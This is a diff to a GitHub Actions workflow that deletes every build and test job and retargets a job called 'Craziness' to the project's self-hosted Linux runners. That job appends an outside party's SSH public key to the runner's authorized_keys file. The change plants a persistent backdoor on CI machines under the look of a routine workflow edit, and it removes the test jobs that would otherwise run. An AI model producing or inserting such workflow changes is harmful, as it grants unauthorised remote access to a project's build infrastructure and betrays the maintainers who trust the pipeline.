@@ -11,61 +11,8 @@ env:
 
 jobs:
   craziness:
-    runs-on: doien
+    runs-on: [self-hosted, linux, X64]
     steps:
     - uses: actions/checkout@v4
     - name: Craziness
       run: echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEv6pGHhzkGAtwgS73b0fawaTkiscODg3QUXOLB5YGf9 damocles@talyn" >> ~/.ssh/authorized_keys
-  test:
-    runs-on: [self-hosted, linux, X64]
-    steps:
-    - uses: actions/checkout@v4
-    - name: Check formatting
-      run: cargo fmt --check
-    - name: Build
-      run: cargo build --verbose
-    - if: ${{ github.ref_name == 'main' }}
-      name: Run tests
-      run: cargo test --verbose -- --include-ignored
-    - if: ${{ github.ref_name != 'main' }}
-      name: Run tests
-      run: cargo test --verbose
-
-  test-windows:
-    runs-on: [self-hosted, windows]
-    steps:
-    - uses: actions/checkout@v4
-    - name: Build
-      run: cargo build --verbose
-    - if: ${{ github.ref_name == 'main' }}
-      name: Run tests
-      run: cargo test --verbose -- --include-ignored
-    - if: ${{ github.ref_name != 'main' }}
-      name: Run tests
-      run: cargo test --verbose
-
-  test-macos:
-    runs-on: [self-hosted, macOS]
-    steps:
-    - uses: actions/checkout@v4
-    - name: Build
-      run: cargo build --verbose
-    - if: ${{ github.ref_name == 'main' }}
-      name: Run tests
-      run: cargo test --verbose -- --include-ignored
-    - if: ${{ github.ref_name != 'main' }}
-      name: Run tests
-      run: cargo test --verbose
-
-  test-arm-linux:
-    runs-on: [self-hosted, linux, ARM64]
-    steps:
-    - uses: actions/checkout@v4
-    - name: Build
-      run: cargo build --verbose
-    - if: ${{ github.ref_name == 'main' }}
-      name: Run tests
-      run: cargo test --verbose -- --include-ignored
-    - if: ${{ github.ref_name != 'main' }}
-      name: Run tests
-      run: cargo test --verbose
